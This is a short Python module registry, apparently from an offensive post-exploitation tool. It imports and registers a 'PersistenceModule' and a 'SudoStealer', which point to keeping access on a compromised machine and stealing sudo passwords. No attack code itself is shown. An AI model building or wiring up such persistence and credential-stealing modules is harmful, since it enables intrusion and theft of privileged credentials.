from modules.persistence import PersistenceModule
from modules.sudostealer.server import SudoStealer

MODULES = {i.name: i for i in [PersistenceModule, SudoStealer]}